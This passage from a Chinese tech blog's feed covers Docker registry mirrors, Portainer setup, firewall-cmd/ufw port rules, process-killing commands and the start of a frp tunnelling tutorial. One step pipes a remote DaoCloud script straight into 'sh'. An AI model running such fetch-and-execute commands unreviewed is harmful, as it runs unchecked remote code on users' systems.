rel="noopener">https://lug.ustc.edu.cn/wiki/mirrors/help/docker</a></p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="Azure-中国镜像"><a href="#Azure-中国镜像" class="headerlink" title="Azure 中国镜像"></a>Azure 中国镜像</h3><p><a href="https://github.com/Azure/container-service-for-azure-china/blob/master/aks/README.md#22-container-registry-proxy" target="_blank" rel="noopener">https://github.com/Azure/container-service-for-azure-china/blob/master/aks/README.md#22-container-registry-proxy</a></p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"https://dockerhub.azk8s.cn"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="DaoCloud-源"><a href="#DaoCloud-源" class="headerlink" title="DaoCloud 源"></a>DaoCloud 源</h3><p><a href="https://www.daocloud.io/mirror" target="_blank" rel="noopener">https://www.daocloud.io/mirror</a></p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"http://f1361db2.m.daocloud.io"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>或者 直接执行这个就可以一键修改</p><pre class=" language-bash"><code class="language-bash">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh <span class="token operator">|</span> sh -s http://f1361db2.m.daocloud.io</code></pre><h3 id="163网易源"><a href="#163网易源" class="headerlink" title="163网易源"></a>163网易源</h3><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"http://hub-mirror.c.163.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="阿里源"><a href="#阿里源" class="headerlink" title="阿里源"></a>阿里源</h3><p>要注册，略。</p><h3 id="配置多个镜像"><a href="#配置多个镜像" class="headerlink" title="配置多个镜像"></a>配置多个镜像</h3><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">,</span>    <span class="token string">"https://dockerhub.azk8s.cn/"</span><span class="token punctuation">,</span>    <span class="token string">"http://hub-mirror.c.163.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>注意遵循<code>json</code>格式。</p><h3 id="配置完之后重启服务"><a href="#配置完之后重启服务" class="headerlink" title="配置完之后重启服务"></a>配置完之后重启服务</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart docker</code></pre><h3 id="检查加速器是否生效"><a href="#检查加速器是否生效" class="headerlink" title="检查加速器是否生效"></a>检查加速器是否生效</h3><pre class=" language-bash"><code class="language-bash">docker info</code></pre><p>有如下信息则配置成功。</p><p><img src="/2020/02/02/Server_Docker/mirror.png" alt="mirrors"></p><hr><h2 id="Portainer"><a href="#Portainer" class="headerlink" title="Portainer"></a>Portainer</h2><blockquote><p>Portainer 是 Docker 的图形化管理工具，提供状态显示面板、应用模板快速部署、容器镜像网络数据卷的基本操作（包括上传下载镜像，创建容器等操作）、事件日志显示、容器控制台操作、Swarm集群和服务等集中管理和操作、登录用户管理和控制等功能。功能十分全面，基本能满足中小型单位对容器管理的全部需求。</p></blockquote><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 拉取镜像</span>docker pull portainer/portainer<span class="token comment" spellcheck="true"># 一键部署</span>docker volume create portainer_datadocker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer</code></pre><p>访问 <a href="http://127.0.0.1:9000" target="_blank" rel="noopener">http://127.0.0.1:9000</a> 即可访问图形化面板。配置好用户名、密码后登录。</p><p><img src="/2020/02/02/Server_Docker/portainer.png" alt="登录界面"></p><p>连接到Local，登录后的主界面如下。</p><p><img src="/2020/02/02/Server_Docker/portainer2.png" alt="Home"></p><h3 id="通过远程访问"><a href="#通过远程访问" class="headerlink" title="通过远程访问"></a>通过远程访问</h3><p>需要在防火墙放行9000端口。</p><p>Ubuntu:</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow 9000  </code></pre><p>CentOS:（其实也可以装个 ufw 的）</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span>9000/tcp --permanent  <span class="token comment" spellcheck="true"># 开放端口</span><span class="token function">sudo</span> systemctl restart firewalld.service    <span class="token comment" spellcheck="true"># 重启firewall</span></code></pre><h3 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h3><pre class=" language-bash"><code class="language-bash">docker update --restart<span class="token operator">=</span>always portainer</code></pre><p>其实在上面的一键部署命令中已经加了，这里不需要了。（记录一下而已）</p><hr><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h3><h4 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h4><pre class=" language-bash"><code class="language-bash">docker info</code></pre><h4 id="查看镜像、容器、数据卷所占用的空间"><a href="#查看镜像、容器、数据卷所占用的空间" class="headerlink" title="查看镜像、容器、数据卷所占用的空间"></a>查看镜像、容器、数据卷所占用的空间</h4><pre class=" language-bash"><code class="language-bash">docker system <span class="token function">df</span></code></pre><hr><h3 id="容器相关"><a href="#容器相关" class="headerlink" title="容器相关"></a>容器相关</h3><h4 id="查看当前容器"><a href="#查看当前容器" class="headerlink" title="查看当前容器"></a>查看当前容器</h4><pre class=" language-bash"><code class="language-bash">docker <span class="token function">ps</span> -a</code></pre><p>有<code>-a</code>则显示所有的容器，包括启动的和未启动的。没有<code>-a</code>的话则只显示运行着的。</p><h4 id="创建-amp-使用容器"><a href="#创建-amp-使用容器" class="headerlink" title="创建&amp;使用容器"></a>创建&amp;使用容器</h4><pre class=" language-bash"><code class="language-bash">docker run -it --name 容器名 镜像名/镜像ID /bin/bash</code></pre><p>使用 <code>-d</code> 参数运行容器，可以让容器在后台运行而不把STDOUT输出到宿主机上。</p><p>（用<code>docker logs [container ID or NAMES]</code>查看）</p><p>当 <code>-i</code> <code>-t</code> 参数一起使用时，可以看到 Linux 命令提示符，如<code>root@69d137adef7a:/#</code>。只有 <code>-i</code>则没有命令提示符。</p><h4 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h4><pre class=" language-bash"><code class="language-bash">docker start 容器名/容器ID</code></pre><h4 id="重启容器"><a href="#重启容器" class="headerlink" title="重启容器"></a>重启容器</h4><pre class=" language-bash"><code class="language-bash">docker restart 容器名/容器ID</code></pre><h4 id="终止容器"><a href="#终止容器" class="headerlink" title="终止容器"></a>终止容器</h4><pre class=" language-bash"><code class="language-bash">docker stop 容器名/容器ID</code></pre><h4 id="查看容器信息"><a href="#查看容器信息" class="headerlink" title="查看容器信息"></a>查看容器信息</h4><pre class=" language-bash"><code class="language-bash">docker container <span class="token function">ls</span> -a</code></pre><h4 id="容器统计信息"><a href="#容器统计信息" class="headerlink" title="容器统计信息"></a>容器统计信息</h4><pre class=" language-bash"><code class="language-bash">docker stats</code></pre><h4 id="启动已终止容器"><a href="#启动已终止容器" class="headerlink" title="启动已终止容器"></a>启动已终止容器</h4><pre class=" language-bash"><code class="language-bash">docker container start</code></pre><h4 id="获取容器的输出信息"><a href="#获取容器的输出信息" class="headerlink" title="获取容器的输出信息"></a>获取容器的输出信息</h4><pre class=" language-bash"><code class="language-bash">docker container logs <span class="token punctuation">[</span>container ID or NAMES<span class="token punctuation">]</span></code></pre><h4 id="进入容器（连接容器）"><a href="#进入容器（连接容器）" class="headerlink" title="进入容器（连接容器）"></a>进入容器（连接容器）</h4><pre class=" language-bash"><code class="language-bash">docker <span class="token function">exec</span> -it 容器名/容器ID /bin/bash</code></pre><p>从这个 stdin 中 exit，不会导致容器的停止。<strong>（推荐↑）</strong></p><p>而下面这个，从这个 stdin 中 exit，会导致容器的停止。</p><pre class=" language-bash"><code class="language-bash">docker attach 容器名/容器ID</code></pre><h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><pre class=" language-bash"><code class="language-bash">docker <span class="token function">rm</span> 容器名/容器ID</code></pre><hr><h3 id="镜像相关"><a href="#镜像相关" class="headerlink" title="镜像相关"></a>镜像相关</h3><h4 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h4><pre class=" language-bash"><code class="language-bash">docker search 关键词</code></pre><h4 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h4><pre class=" language-bash"><code class="language-bash">docker pull 镜像名</code></pre><p><code>镜像名:Tag</code> 可以下载不同标签的镜像。</p><h4 id="查看已下载镜像"><a href="#查看已下载镜像" class="headerlink" title="查看已下载镜像"></a>查看已下载镜像</h4><pre class=" language-bash"><code class="language-bash">docker images -a<span class="token comment" spellcheck="true"># 或者 docker image ls</span></code></pre><h4 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h4><pre class=" language-bash"><code class="language-bash">docker rmi <span class="token punctuation">[</span>Image ID<span class="token punctuation">]</span></code></pre><hr><h3 id="端口相关"><a href="#端口相关" class="headerlink" title="端口相关"></a>端口相关</h3><h4 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h4><p>将docker内的80端口映射到宿主机的8000端口上</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 可以使用--name自定义部署的容器名</span>docker run -d -p 8000:80 --name 容器名 镜像名<span class="token comment" spellcheck="true"># 也可以直接通过镜像部署</span>docker run -d -p 8000:80 镜像名</code></pre><p><em>（别急，慢慢学好了啦……</em></p><hr><h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><p><strong>Docker从入门到实践 GitBook</strong>  <a href="https://yeasy.gitbooks.io/docker_practice/content/" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/content/</a></p><p>Docker-镜像常用命令 <a href="https://blog.csdn.net/y472360651/article/details/81289088" target="_blank" rel="noopener">https://blog.csdn.net/y472360651/article/details/81289088</a></p><p>Docker温故知新 <a href="https://www.sqlsec.com/2019/10/docker2.html" target="_blank" rel="noopener">https://www.sqlsec.com/2019/10/docker2.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Docker </tag>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Firewall &amp; Port Configuration</title>
      <link href="/2020/01/29/Server_firewall/"/>
      <url>/2020/01/29/Server_firewall/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在配服务器环境的时候，动不动遇到端口无法访问的情况，折腾了老半天，经过分析判断最后基本是防火墙把网络端口给拦了……</p><p>于是就来简要记录一下Linux下的防火墙配置，以及端口开放、关闭的配置方法。</p><p>整理自网络啦。</p><hr><h2 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h2><p>CentOS下用的是<code>firewall-cmd</code></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="启动firewall"><a href="#启动firewall" class="headerlink" title="启动firewall"></a>启动firewall</h4><pre class=" language-bash"><code class="language-bash">systemctl start firewalld.service</code></pre><h4 id="开机自启firewall"><a href="#开机自启firewall" class="headerlink" title="开机自启firewall"></a>开机自启firewall</h4><pre class=" language-bash"><code class="language-bash">systemctl <span class="token function">enable</span> firewalld.service</code></pre><h4 id="查看开机自启是否设置成功"><a href="#查看开机自启是否设置成功" class="headerlink" title="查看开机自启是否设置成功"></a>查看开机自启是否设置成功</h4><pre class=" language-bash"><code class="language-bash">systemctl is-enabled firewalld.service<span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$?</span></code></pre><blockquote><p>返回如下则开启成功</p><pre><code>enabled0</code></pre></blockquote><h4 id="重启firewall"><a href="#重启firewall" class="headerlink" title="重启firewall"></a>重启firewall</h4><pre class=" language-bash"><code class="language-bash">systemctl restart firewalld.service</code></pre><h4 id="关闭firewall"><a href="#关闭firewall" class="headerlink" title="关闭firewall"></a>关闭firewall</h4><pre class=" language-bash"><code class="language-bash">systemctl stop firewalld.service</code></pre><h4 id="检测firewall状态"><a href="#检测firewall状态" class="headerlink" title="检测firewall状态"></a>检测firewall状态</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --state</code></pre><blockquote><p>例如正在运行：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># firewall-cmd --state</span>running</code></pre><p>不在运行则为<code>not running</code></p></blockquote><h3 id="端口配置"><a href="#端口配置" class="headerlink" title="端口配置"></a>端口配置</h3><h4 id="查看开放（监听）的端口"><a href="#查看开放（监听）的端口" class="headerlink" title="查看开放（监听）的端口"></a>查看开放（监听）的端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --list-ports</code></pre><blockquote><p>example：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># firewall-cmd --list-ports</span>80/tcp 7650/tcp 3306/tcp</code></pre></blockquote><p>或</p><pre class=" language-bash"><code class="language-bash"><span class="token function">netstat</span> -ntlp</code></pre><blockquote><p>如果没有的话（<em>centos7默认没有 netstat 命令</em>），先安装<code>net-tools</code>。</p><pre class=" language-bash"><code class="language-bash">yum <span class="token function">install</span> -y net-tools</code></pre></blockquote><blockquote><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># netstat -ntlp</span>Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      14301/mysqldtcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1840/sshdtcp6       0      0 :::6011                 :::*                    LISTEN      8037/sshd: root@ptstcp6       0      0 :::22                   :::*                    LISTEN      1840/sshd……</code></pre><p>其中<code>tcp</code>为ipv4，<code>tcp6</code>为ipv6.</p></blockquote><p>遇到过几次没有开放firewall端口时，只有<code>tcp6</code>而无<code>tcp</code>的情况，导致访问失败。放行端口后访问正常。</p><p>还遇到过只能从本地 127.0.0.1 或 localhost（实际上二者一样的，默认写在了host里）访问，通过（网卡的）IP地址无法访问的情况。表现在 Local Address 上是<code>127.0.0.1:xxxx</code>，通过修改该程序的网络设置把Address修改为对应的IP或 <code>0.0.0.0</code>，即可解决访问的问题。</p><hr><h4 id="以下操作之后都要执行-重载-或-重启-才能生效！！！"><a href="#以下操作之后都要执行-重载-或-重启-才能生效！！！" class="headerlink" title="以下操作之后都要执行 重载 或 重启 才能生效！！！"></a><strong>以下操作之后都要执行 重载 或 重启 才能生效</strong>！！！</h4><h4 id="开启特定端口"><a href="#开启特定端口" class="headerlink" title="开启特定端口"></a>开启特定端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span>80/tcp --permanent  <span class="token comment" spellcheck="true"># 开放端口</span>systemctl restart firewalld.service    <span class="token comment" spellcheck="true"># 重启firewall</span></code></pre><p>其中， 参数含义为<br><code>--zone</code> 作用域<br><code>--add-port=80/tcp</code>  添加端口，格式为：端口/通讯协议（<code>tcp</code>或<code>udp</code>）<br><code>--permanent</code>   永久生效，没有此参数重启后失效     </p><blockquote><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># firewall-cmd --zone=public --add-port=80/tcp --permanent</span>success</code></pre><p>成功则返回 success</p></blockquote><h4 id="开放多个端口"><a href="#开放多个端口" class="headerlink" title="开放多个端口"></a>开放多个端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span>8080-8083/tcp --permanentfirewall-cmd --reload   <span class="token comment" spellcheck="true"># 配置立即生效</span></code></pre><h4 id="关闭特定端口"><a href="#关闭特定端口" class="headerlink" title="关闭特定端口"></a>关闭特定端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --remove-port<span class="token operator">=</span>5672/tcp --permanent  <span class="token comment" spellcheck="true">#关闭5672端口</span>firewall-cmd --reload   <span class="token comment" spellcheck="true"># 配置立即生效</span><span class="token comment" spellcheck="true"># 也可以用restart</span></code></pre><h4 id="针对某个-IP-开放端口"><a href="#针对某个-IP-开放端口" class="headerlink" title="针对某个 IP 开放端口"></a>针对某个 IP 开放端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source  address="</span>192.168.142.166<span class="token string">" port protocol="</span>tcp<span class="token string">" port="</span>6379<span class="token string">" accept"</span>firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span>192.168.0.233<span class="token string">" accept"</span></code></pre><h4 id="删除某个-IP"><a href="#删除某个-IP" class="headerlink" title="删除某个 IP"></a>删除某个 IP</h4><pre class=" language-bash"><code class="language-bash"> firewall-cmd --permanent --remove-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span>192.168.1.51<span class="token string">" accept"</span></code></pre><h4 id="针对一个-IP-段访问"><a href="#针对一个-IP-段访问" class="headerlink" title="针对一个 IP 段访问"></a>针对一个 IP 段访问</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span>192.168.0.0/16<span class="token string">" accept"</span>firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source  address="</span>192.168.1.0/24<span class="token string">" port protocol="</span>tcp<span class="token string">" port="</span>9200<span class="token string">" accept"</span></code></pre><br><hr><br><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>Ubuntu 系统默认提供了一个基于<code>iptables</code>之上的防火墙工具<code>ufw</code>。</p><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="安装ufw"><a href="#安装ufw" class="headerlink" title="安装ufw"></a>安装<code>ufw</code></h4><p>（默认已安装）</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ufw</code></pre><h4 id="启用ufw，且在系统启动时自启"><a href="#启用ufw，且在系统启动时自启" class="headerlink" title="启用ufw，且在系统启动时自启"></a>启用<code>ufw</code>，且在系统启动时自启</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw <span class="token function">enable</span></code></pre><h4 id="关闭ufw"><a href="#关闭ufw" class="headerlink" title="关闭ufw"></a>关闭<code>ufw</code></h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw disable</code></pre><h4 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw status</code></pre><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p>系统日志保存于<code>/var/log/ufw.log</code>。LEVEL指定不同的级别 ，默认级别是‘低’</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw logging on<span class="token operator">|</span>off  LEVEL   </code></pre><h3 id="端口相关"><a href="#端口相关" class="headerlink" title="端口相关"></a>端口相关</h3><h4 id="设置默认策略"><a href="#设置默认策略" class="headerlink" title="设置默认策略"></a>设置默认策略</h4><p>（比如 “mostly open” vs “mostly closed”）</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw default allow  <span class="token comment" spellcheck="true"># 允许所有外部对本机的访问，且本机访问外部正常。</span><span class="token function">sudo</span> ufw default deny   <span class="token comment" spellcheck="true"># 关闭所有外部对本机的访问，但本机访问外部正常。</span></code></pre><h4 id="打开某个端口"><a href="#打开某个端口" class="headerlink" title="打开某个端口"></a>打开某个端口</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow smtp　   <span class="token comment" spellcheck="true"># 允许所有的外部IP访问本机的25/tcp （smtp）端口</span><span class="token function">sudo</span> ufw allow 22/tcp   <span class="token comment" spellcheck="true"># 允许所有的外部IP访问本机的22/tcp （ssh）端口</span><span class="token function">sudo</span> ufw allow 53       <span class="token comment" spellcheck="true"># 允许外部访问53端口（tcp/udp）</span><span class="token function">sudo</span> ufw allow from 192.168.1.100  <span class="token comment" spellcheck="true"># 允许此IP访问所有的本机端口</span><span class="token function">sudo</span> ufw allow proto udp 192.168.0.1 port 53 to 192.168.0.2 port 53<span class="token function">sudo</span> ufw allow <span class="token keyword">in</span> on eth0 from 192.168.0.0/16  <span class="token comment" spellcheck="true"># 允许来自192.168.0.0-192.168.255.255的数据通过eth0网卡进入主机</span><span class="token function">sudo</span> ufw allow out on eth1 to 10.0.0.0/8   <span class="token comment" spellcheck="true"># 允许指向10.0.0.0-10.255.255.255的数据通过eth1网卡从本机发出</span></code></pre><p>可以用<code>less /etc/services</code>列出所有服务信息，其中包括该服务使用了哪个端口和哪种协议</p><h4 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw deny smtp          <span class="token comment" spellcheck="true"># 禁止外部访问smtp服务</span><span class="token function">sudo</span> ufw delete allow smtp  <span class="token comment" spellcheck="true"># 删除上面建立的某条规则</span><span class="token function">sudo</span> ufw delete allow 80    <span class="token comment" spellcheck="true"># 禁止外部访问80端口</span><span class="token function">sudo</span> ufw deny proto tcp from 10.0.0.0/8 to 192.168.0.1 port 25  <span class="token comment" spellcheck="true"># 拒绝来自10.0.0.0/8域tcp协议指向192.168.0.1端口25的数据进入本机</span></code></pre><h4 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw route allow <span class="token keyword">in</span> on eth1 out on eth2   <span class="token comment" spellcheck="true"># 允许经eth1进入，eth2发出的数据经本机路由</span></code></pre><hr><h2 id="进程相关命令"><a href="#进程相关命令" class="headerlink" title="进程相关命令"></a>进程相关命令</h2><h3 id="查看进程的详细信息"><a href="#查看进程的详细信息" class="headerlink" title="查看进程的详细信息"></a>查看进程的详细信息</h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ps 1</span>  PID TTY      STAT   TIME COMMAND    1 ?        Ss     7:25 /usr/lib/systemd/systemd --switched-root --system --deserialize 22</code></pre><h3 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">kill</span> -9 1234</code></pre><p>1234为对应的PID</p><blockquote><p>只有第9种信号(SIGKILL)才可以无条件终止进程，其他信号进程都有权利忽略。    </p><p>下面是常用的信号：<br>HUP    1    终端断线<br>INT     2    中断（同 Ctrl + C）<br>QUIT    3    退出（同 Ctrl + \）<br>TERM   15    终止<br>KILL    9    强制终止<br>CONT   18    继续（与STOP相反， fg/bg命令）<br>STOP    19    暂停（同 Ctrl + Z）  </p></blockquote><p>或者 </p><p><strong>杀死指定名字的进程</strong>（kill processes by name），可以批量结束某个服务程序带有的全部进程。</p><ol><li>杀死所有同名进程   <pre class=" language-bash"><code class="language-bash"> <span class="token function">killall</span> nginx <span class="token function">killall</span> -9 <span class="token function">bash</span></code></pre></li><li>向进程发送指定信号   <pre class=" language-bash"><code class="language-bash"> <span class="token function">killall</span> -TERM ngixn  <span class="token comment" spellcheck="true"># 或者  killall -KILL nginx</span></code></pre></li></ol><blockquote><p>命令参数：</p><pre><code>-Z 只杀死拥有scontext 的进程-e 要求匹配进程名称-I 忽略小写-g 杀死进程组而不是进程-i 交互模式，杀死进程前先询问用户-l 列出所有的已知信号名称-q 不输出警告信息-s 发送指定的信号-v 报告信号是否成功发送-w 等待进程死亡--help 显示帮助信息--version 显示版本显示</code></pre></blockquote><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/zll_0405/article/details/81208606" target="_blank" rel="noopener">https://blog.csdn.net/zll_0405/article/details/81208606</a></p><p><a href="https://blog.csdn.net/bigdata_mining/article/details/80699180" target="_blank" rel="noopener">https://blog.csdn.net/bigdata_mining/article/details/80699180</a></p><p>etc.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Configuration </tag>
            
            <tag> tips </tag>
            
            <tag> firewall </tag>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于frp实现内网穿透</title>
      <link href="/2020/01/29/Server_frp/"/>
      <url>/2020/01/29/Server_frp/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前为了实现远程编程，折腾了一阵子<code>autossh</code>，利用反向代理把内网服务器的ssh映射到了公网端口，详见下面这篇。</p><blockquote><p><a href="https://miaotony.xyz/2019/12/21/Idea_RemoteProgramming/">小想法 | 基于VSCode和ssh实现远程编程/炼丹</a></p></blockquote><p>这次需求扩大了一点，比如说想访问<strong>内网搭建的网站、数据库等等</strong>，但这些都<strong>不能直接在公网进行访问</strong>，<code>autossh</code>就有点不大给力了。</p><p>之前还了解过花生壳、ngrok这些，但是一般需要money要限速或者说不大友好，然后一想大家都在推荐<code>frp</code>，这回就来折腾一下吧！（主要是以后忘了还可以回来看嘻嘻</p><p>总体感受就是，<strong><code>frp</code>搭建起来比<code>autossh</code>方便多了</strong>呀！</p><br><hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="What-is-frp"><a href="#What-is-frp" class="headerlink" title="What is frp?"></a>What is frp?</h3><blockquote><p><em>frp</em> is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the Internet. As of now, it supports <strong>TCP</strong> and <strong>UDP</strong>, as well as <strong>HTTP</strong> and <strong>HTTPS</strong> protocols, where requests can be forwarded to internal services by domain name.</p><p><em>frp</em> also has a P2P connect mode.</p></blockquote><blockquote><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透。</p></blockquote><p><img src="/2020/01/29/Server_frp/architecture.png" alt="architecture"></p><p>FRP，fast reverse proxy。使用 Go 语言开发，支持 Windows、Linux、macOS、ARM 等多平台部署。</p><p>其实简单地说也就是借助一台有公网IP的服务器作为中转，把内外网直接的流量连接起来。</p><p>其开源仓库：<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><h3 id="What-should-I-prepare"><a href="#What-should-I-prepare" class="headerlink" title="What should I prepare?"></a>What should I prepare?</h3><p><strong>内网主机（客户端）：</strong>能上互联网（外网），或者说能连上你的公网服务器就行。（但没有公网IP）</p><p>可以是电脑（Windows，MacOS，Linux）/嵌入式设备（如树莓派）…对的，<strong>frp跨平台</strong>。</p><p><strong>公网主机（服务端）：</strong>有公网IP，或者绑定了域名能通过端口访问也行。</p><p>以及</p><p>想<strong>连接内网的你喜欢的设备</strong>。</p><br><hr><br><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p>分为<strong>服务器端</strong>和<strong>客户端</strong>两部分。</p><h3 id="下载程序"><a href="#下载程序" class="headerlink" title="下载程序"></a>下载程序</h3><p>根据对应的操作系统及架构，从 <a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">Release</a> 